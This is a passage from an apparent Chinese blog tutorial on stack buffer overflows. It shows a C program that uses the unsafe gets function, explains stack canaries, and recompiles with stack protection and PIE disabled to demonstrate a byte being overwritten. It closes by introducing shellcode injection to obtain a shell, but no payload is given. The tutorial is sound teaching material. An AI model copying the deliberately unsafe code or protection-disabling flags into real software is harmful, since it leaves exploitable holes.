a[5]); } 直接编译\n1 gcc buffer_overflow1.c 可以看到如下warning\n1 2 3 4 5 6 7 buffer_overflow1.c: In function ‘main’: buffer_overflow1.c:6:5: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration] 6 | gets(a); | ^~~~ | fgets /usr/bin/ld: /tmp/ccA63mQo.o: in function `main\u0026#39;: buffer_overflow1.c:(.text+0x28): warning: the `gets\u0026#39; function is dangerous and should not be used. 这是因为gets(puts)是一个不安全的函数，缺少缓冲区边界检查，即没有对读入字符个数的检查和限制。 现在编译后的可执行文件\n1 ./a.out 输入6个字母abcdef，可以看到如下输出\n1 2 3 4 abcdef abcdef *** stack smashing detected ***: terminated Aborted (core dumped) 可以看到程序被终止，并且给出了*** stack smashing detected ***: terminated，这是由堆栈保护机制（Stack Smashing Protection, SSP）发出的警告信息。当编译器开启了 SSP 选项（例如 GCC 的 -fstack-protector 或 -fstack-protector-all）时，它会在函数栈帧中插入一个被称为“canary”（金丝雀）的随机值。如果缓冲区溢出发生，覆盖了返回地址，那么这个 canary 值也会被改变。在函数返回之前，程序会检查这个 canary 值是否被篡改。如果被篡改，就意味着发生了缓冲区溢出，程序会立即终止执行，并打印这个警告信息。 现在在关闭相关保护机制的情况下编译\n1 gcc -fno-stack-protector -no-pie buffer_overflow1.c 其中的编译选项含义如下：\n-fno-stack-protector: 禁用堆栈保护（stack canary）。这会阻止编译器在缓冲区溢出发生时自动终止程序。 -no-pie: 禁用位置独立可执行文件（Position Independent Executable），使得程序加载到固定的内存地址。这与另一种针对栈溢出的防御地址空间布局随机化（ASLR）有关。 运行后得到如下输出\n1 2 3 abcdef abcdef f 可以看到输入的字符成功覆盖了字符串的后一个字节。即可以利用栈溢出篡改内存中的字节，这是栈溢出攻击的基本原理。\n利用栈溢出的攻击方式————拿shell\r即通过栈溢出注入shellcode来获取目标程序的shell，得到shell后就可以劫持数据流\n","date":"2025-07-11T21:59:00+08:00","permalink":"https://example.com/p/%E6%A0%88%E6%BA%A2%E5%87%BAstack-overflow%E4%B8%8E%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E4%B8%AD%E7%9A%84%E6%A0%88%E5%8F%98%E5%8C%96/","title":"栈溢出（Stack Overflow）与函数调用中的栈变化"}]